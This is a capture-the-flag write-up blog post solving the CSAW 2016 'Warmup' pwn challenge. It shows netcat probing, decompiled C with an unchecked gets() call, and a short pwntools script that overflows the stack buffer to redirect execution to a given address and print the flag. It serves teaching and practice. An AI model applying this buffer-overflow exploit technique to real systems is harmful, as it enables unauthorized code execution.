---
title: '[CSAW 2016] PWN: Warmup Writeup'
author: Megabeets
type: post
date: 2016-09-18T22:01:55+00:00
url: /csaw-2016-pwn-warmup-writeup/
categories:
  - CSAW CTF 2016
  - Writeups
tags:
  - CSAW-2016
  - CTF
  - PWN
  - Writeups

---
#### **Description:**

> _So you want to be a pwn-er huh? Well let&#8217;s throw you an easy one 😉_  
> _nc pwn.chal.csaw.io 8000_
> 
> _<a class="chal-file" href="https://ctf.csaw.io/static/uploads/8ef117ec4c05f79aebdf043f3d003c2b/warmup" target="_blank">warmup</a>_

Let&#8217;s connect to the server and play with it a little bit:

```sh
[Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
&gt;Beet

[Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
&gt;Beetttttttttttttttttttttt

[Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```


The program says &#8220;WOW:&#8221; followed by a memory address. This address is probably the address of the function we need to execute. Let&#8217;s open IDA to view the code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	  char s; // [sp+0h] [bp-80h]@1
	  char v5; // [sp+40h] [bp-40h]@1

	  write(1, "-Warm Up-\n", 0xAuLL);
	  write(1, "WOW:", 4uLL);
	  sprintf(&s, "%p\n", 4195853LL);
	  write(1, &s, 9uLL);
	  write(1, (const void *)'@\aU', 1uLL);
	  return gets(&v5, '&gt;');
}b
```


This is a classic BOF (Buffer Overflow) case. The main method uses the `gets()` function to receive the given input and returns it. `gets()` is storing 64 characters (40h). Because there is no validation of the given string we need to supply an input that will exploit the program and make it jump to the wanted address: 0x40060d.

A short python script will do the job:

```python
from pwn import *

r = remote('pwn.chal.csaw.io', 8000)
print r.recv()
r.sendline("A"*72 + "\x0D\x06\x40\x00\x00\x00\x00\x00")
print r.recvline()
```


And we got the flag: _FLAG{LET\_US\_BEGIN\_CSAW\_2016}_

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img src="../uploads/megabeets_inline_logo.png" />Eat Veggies</a>
  </p>
</div>